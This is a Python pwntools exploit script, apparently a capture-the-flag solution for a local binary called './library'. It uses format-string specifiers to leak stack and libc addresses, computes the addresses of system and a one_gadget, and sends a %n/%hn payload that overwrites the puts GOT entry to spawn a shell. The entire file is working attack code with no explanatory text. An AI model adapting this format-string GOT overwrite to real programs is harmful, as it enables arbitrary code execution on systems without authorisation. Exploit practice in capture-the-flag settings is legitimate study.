from pwn import *

def pad(s):
	return s + 'x'*(0x40 - len(s))
	
def overwrite_got(p, one_gadget):
	puts_got = 0x601018
	
	p.recvuntil("And what book would you like to check out?\n")
	
	off1 = int('0x' + hex(one_gadget)[-4:], 16)# lsb
	print(off1)
	off2 = int('0x' + hex(one_gadget)[-8:-4], 16)
	print(off2)
	off3 = int('0x' + hex(one_gadget)[-12:-8], 16)# msb
	print(off3)
	
	while(off1>off2):
		off2 += 0x10000
	#while(off2>off3):
	#	off3 += 0x10000000
		
	pay = ""
	pay += "%{}p".format(off1-4)
	pay += "a"*4
	pay += "%20$n"
	pay += "%{}p".format(off2-off1-3)
	pay += "b"*3
	pay += "%21$hn"
	pay += p64(puts_got)
	pay += p64(puts_got+2)
	pay += p64(0x0)*2	
	pay = pad(pay)
	
	p.sendline(pay)

def get_leaks(p):
	p.recvuntil('What is your name?\n')
	p.sendline("%17$p %25$p %27$p ")
	
	p.recvuntil('Why hello there ')
	s = p.recvline()[:-1]
	s = s.split()
	
	# pop_rdi = 0x00000000004008f3
	rbp = int(s[0], 16) + 0x19
	info("rbp leak: %s"%hex(rbp))
	rip = rbp + 0x8

	leak = int(s[2], 16)
	libc_base = leak - 0x270b3
	info("libc_base: %s"%hex(libc_base))
	system = libc_base + 0x55410
	info("system address: %s"%hex(system))

	one_gadget = libc_base + 0xe6c81
	info("one_gadget: %s"%hex(one_gadget))
	
	return one_gadget

if __name__=="__main__":
	p = process('./library')
	gdb.attach(p, gdbscript='''b*0x0000000000400821
	c
	''')
	
	one_gadget = get_leaks(p)
	
	overwrite_got(p, one_gadget)
	
	p.interactive()
